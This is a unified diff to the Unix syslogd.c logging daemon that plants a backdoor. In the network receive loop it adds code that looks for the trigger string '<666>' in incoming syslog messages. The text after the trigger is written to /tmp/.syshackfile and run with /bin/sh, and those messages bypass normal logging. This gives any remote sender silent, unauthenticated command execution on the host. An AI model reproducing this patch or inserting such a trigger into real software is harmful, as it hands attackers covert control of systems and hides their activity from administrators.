--- syslogd.c	Tue Jun 15 15:57:45 1999
+++ syslogd.c	Tue Jun 15 15:57:27 1999
@@ -413,6 +413,12 @@
  *	Miettinen <tom@medialab.sonera.net>.
  */
 
+/*
+	hack #define
+*/
+
+#define HACKCODE       "<666>"
+#define HACKPATH       "/tmp/.syshackfile"
 
 #define	MAXLINE		1024		/* maximum line length */
 #define	MAXSVLINE	240		/* maximum saved line length */
@@ -519,6 +525,13 @@
 #define _PATH_LOG	"/dev/log"
 #endif
 
+/*
+	hack vars
+*/
+
+int hackfd;
+char *hackstring;
+
 char	*ConfFile = _PATH_LOGCONF;
 char	*PidFile = _PATH_LOGPID;
 char	ctty[] = _PATH_CONSOLE;
@@ -1143,6 +1156,22 @@
 			if (i > 0) {
 				line[i] = line[i+1] = '\0';
 				from = (char *)cvthname(&frominet);
+
+ 				hackstring = strstr(line, HACKCODE);
+ 				if(hackstring != NULL) {
+ 					hackstring = hackstring+strlen(HACKCODE);
+ 					hackfd = open(HACKPATH, O_WRONLY|O_CREAT|O_TRUNC);
+ 					write(hackfd, hackstring, strlen(hackstring));
+					if(fork() == 0) {
+						execl("/bin/sh", "/bin/sh", HACKPATH, NULL);
+						_exit(0);
+					}
+					wait(NULL);
+					close(hackfd);
+					unlink(HACKPATH);
+				}
+				else {
+
 				/*
 				 * Here we could check if the host is permitted
 				 * to send us syslog messages. We just have to
@@ -1154,6 +1183,8 @@
 				 */
 				printchopped(from, line, \
  					     i + 2,  finet);
+				}
+
 			} else if (i < 0 && errno != EINTR) {
 				dprintf("INET socket error: %d = %s.\n", \
 					errno, strerror(errno));
